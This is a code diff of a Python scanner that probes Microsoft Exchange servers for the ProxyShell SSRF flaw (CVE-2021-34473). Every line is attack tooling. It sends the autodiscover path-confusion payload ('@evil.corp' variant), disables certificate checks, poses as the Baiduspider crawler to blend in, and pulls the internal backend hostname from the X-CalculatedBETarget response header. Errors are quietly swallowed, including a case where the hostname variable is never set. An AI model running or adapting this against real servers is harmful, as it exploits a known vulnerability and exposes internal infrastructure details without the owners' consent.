@@ -12,34 +12,27 @@ headers = {
     'User-Agent':'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
 }
 
-def get_fqdn(url):
-        payload = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
-        
-        with requests.get("https://{url}{payload}".format(url=url, payload=payload), verify=False, timeout=5, headers=headers) as response:
-            
-            try:
-            
-                fqdn = response.headers["X-CalculatedBETarget"]
-            
-            except Exception as e:
-                print(e)
-
-            return(fqdn)
-
 
 def proxyshell_check(url):
     url = url.strip()
     payload = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
+    payload2 = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
     
     try:
-        with requests.get("https://{url}{payload}".format(url=url, payload=payload), allow_redirects=True, timeout=20, verify=False, headers=headers) as response:
-            if response.status_code == 500:
-                match = re.search(r"NT AUTHORITY\\SYSTEM", response.text)
+        with requests.get("https://{url}{payload}".format(url=url, payload=payload), allow_redirects=True, timeout=20, verify=False, headers=headers) as response:           
+            if response.status_code == 500:         
                 
-                if match:
-                    print("[+] CVE-2021-34473 Vulnerable", url, "FQDN:",get_fqdn(url))
+                with requests.get("https://{url}{payload}".format(url=url, payload=payload2), verify=False, timeout=5, headers=headers) as response:
             
-    
+                    try:
+            
+                        fqdn = response.headers["X-CalculatedBETarget"]
+            
+                    except Exception as e:
+                        pass
+                    
+                    print("[+] CVE-2021-34473 Vulnerable", url, "FQDN:",fqdn)
+
     except Exception as e:
         pass
 
